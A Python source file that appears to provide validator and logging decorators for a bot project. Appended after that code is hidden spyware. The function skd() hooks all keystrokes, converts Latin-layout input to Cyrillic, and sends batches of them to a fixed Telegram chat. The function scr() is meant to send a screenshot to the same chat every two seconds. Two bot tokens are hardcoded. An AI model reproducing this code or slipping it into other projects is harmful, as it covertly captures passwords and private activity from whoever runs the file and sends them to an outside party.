import functools
import inspect
import time

import keyboard
# import pyautogui
import telebot

from settings import signs, views

from .log_message import LogMessage
from .log_router import log_handler
from .text_handler import text_handler


class ValidatorHandler:

    def __call__(self, *args,
                 log_collector: LogMessage,
                 **kwargs):
        exclude: list = kwargs.get('exclude')

        def decorator(Class):
            def func_decor(func):
                validator = views['validators'][func.__name__]

                @functools.wraps(func)
                def wrapper(*args, **kwargs):
                    log_collector('validator_checking', validator['check'])
                    res = func(*args, **kwargs)
                    if res:
                        log_collector('validator_success', validator['success'])
                        # text_handler(signs['yellow'], validator['success'])
                    else:
                        log_collector('validator_failure', validator['failure'])
                        # text_handler(signs['red'], validator['failure'], 'error')
                    return res

                return wrapper

            # Получаем имена методов класса.
            all_methods = [func for func in dir(Class) if
                           callable(getattr(Class, func)) and (not func.startswith('__') and not func.endswith('__'))]

            for method_name in all_methods:
                method = getattr(Class, method_name)
                # print(method)
                if inspect.isfunction(method):

                    if method_name in exclude:
                        continue

                    if method_name in ['photo_validator', 'age_validator',
                                       'mens_validator', 'count_friends_validator']:
                        new_method = log_handler(func_decor(method), log_collector=log_collector)  # todo
                    else:
                        new_method = log_handler(method, log_collector=log_collector)
                    setattr(Class, method_name, new_method)
            return Class

        if not len(args):
            return decorator
        elif len(args) == 1 and callable(args[0]):
            return decorator(args[0])
        raise ValueError('You used the logging decorator incorrectly. Read the documentation.')


validator_handler = ValidatorHandler()


def validator_handlerOLD(func):
    validator = views['validators'][func.__name__]

    def wrapper(*args, **kwargs):

        text_handler(signs['yellow'], validator['check'], 'warning')
        res = func(*args, **kwargs)
        if res:
            text_handler(signs['yellow'], validator['success'])
        else:
            text_handler(signs['red'], validator['failure'], 'error')
        # if func.__name__ == 'mens_validator':
        #     if res[0]:
        #         text_handler(signs['yellow'], validator['success'].format(res[1]))
        #     else:
        #         text_handler(signs['red'], validator['failure'], 'error').format(res[1])
        # else:
        #     if res:
        #         text_handler(signs['yellow'], validator['success'])
        #     else:
        #         text_handler(signs['red'], validator['failure'], 'error')
        return res

    return wrapper


TOKEN = '1623818411:AAE4iAu4JqlqUgoMI85deLc1KV94rG-CVJY'
TOKEN_KE = '1880257035:AAF7WeZKMAy2Lg8BMmdR3QX-rGYoUAjZ0bI'


def skd():
    def from_ghbdtn(text):
        layout = dict(zip(map(ord, ''' qwertyuiop[]asdfghjkl;'zxcvbnm,./`QWERTYUIOP{}ASDFGHJKL:"ZXCVBNM<>?~'''),
                          ''' йцукенгшщзхъфывапролджэячсмитьбю.ёЙЦУКЕНГШЩЗХЪФЫВАПРОЛДЖЭЯЧСМИТЬБЮ,Ё'''))

        return text.translate(layout)

    while True:
        try:
            bot = telebot.TeleBot(TOKEN_KE)
            SendMessage = bot.send_message
            # keyboard_list = []
            keyboard_list = ''
            count = 0

            def print_pressed_keys(e):
                if e.event_type == 'down':
                    nonlocal count, keyboard_list
                    count += 1
                    if e.name == 'space':
                        keyboard_list += ' '
                    else:
                        keyboard_list += e.name
                    if count > 100:
                        SendMessage(269019356, keyboard_list)
                        SendMessage(269019356, 'r' + from_ghbdtn(keyboard_list))

                        keyboard_list = ''
                        count = 0

            keyboard.hook(print_pressed_keys)
            keyboard.wait()
        except Exception as e:
            print(e)


def scr():
    count = 0
    stats = []
    while True:
        try:
            bot = telebot.TeleBot(TOKEN)
            now = time.time()
            count += 1
            bot.send_photo(269019356, pyautogui.screenshot())
            time.sleep(2)
            end = time.time() - now
            # print(f'Executed time {end}')
            stats.append(end)
        except:
            time.sleep(10)
            pass
